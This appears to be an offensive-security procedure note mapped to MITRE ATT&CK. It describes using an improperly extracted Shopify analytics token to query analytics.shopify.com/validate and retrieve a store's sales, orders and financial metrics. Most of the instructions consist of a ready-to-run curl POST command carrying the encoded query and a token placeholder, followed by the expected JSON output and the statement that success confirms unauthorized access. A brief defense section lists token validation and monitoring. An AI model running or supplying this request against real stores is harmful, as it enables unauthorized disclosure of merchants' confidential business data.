---
tags:
  - shopify
  - analytics
  - information-disclosure
  - token-abuse
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-post-analytics-query]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T17:28:44.304Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b48b6641-f8b2-4029-bf25-e60babeb25ec
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---
# Query-Store-Analytics-Data-Using-Extracted-Token

## Summary

This procedure uses an improperly obtained analytics token to query the analytics.shopify.com endpoint, retrieving sensitive store data like sales, orders, and financial metrics without validating the token's origin or user permissions.

## Description

Once the legacyEasdkAnalyticsToken is extracted, it can be used directly against Shopify's analytics service. The /validate endpoint processes SQL-like queries for reports, accepting the token without additional checks. This allows unauthorized disclosure of business data, such as 30-day sales aggregates. The attack targets the lack of token validation, assuming legitimacy based on the token alone. Expected outcomes include JSON responses with detailed metrics, highlighting the information disclosure risk.

## Requirements

1. Extracted legacyEasdkAnalyticsToken from a prior GraphQL query.
2. Access to https://analytics.shopify.com/validate endpoint.
3. HTTP client capable of POST requests with form-urlencoded data.
4. Knowledge of SQL-like query syntax for Shopify analytics (e.g., SHOW metrics FROM sales).

## Defense

Defensive measures and detection strategies:

- Implement token validation to check origin and associated permissions before processing queries.
- Rate-limit and monitor /validate endpoint for unusual query patterns or token reuse.
- Rotate or invalidate legacy EASDK tokens upon detection of anomalous access.
- Use API gateways to enforce scope checks on analytics services.

## Objectives

1. Retrieve unauthorized analytics data using the bypassed token.
2. Expose sensitive store metrics like sales and orders.
3. Validate the full impact of the permission bypass chain.

## Instructions

### Step 1: Construct and Send Analytics Query

**Context**: Encode the desired SQL-like query for sales data and submit it to the validate endpoint with the token.

**Command** ([[commands/curl-post-analytics-query]]):
```bash
curl -X POST 'https://analytics.shopify.com/validate?beta=true&dataOnly=false' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0' \
  -H 'Origin: https://your-shop.myshopify.com/' \
  -d 'q%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day&source=new-admin&token=eyJ...extracted_token_here'
```

> This command performs a POST with URL-encoded query parameters, simulating admin access. Expected output is a JSON array of daily data points, e.g., {"data":[{"day":"2023-09-01","orders":10,"gross_sales":1000,...}]}. Success confirms unauthorized data access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Information Repositories]] Data from Information Repositories

### Sub-Techniques


## Commands Used

- [[commands/curl-post-analytics-query]]

## Tools Used


## Tags

- shopify
- analytics
- information-disclosure
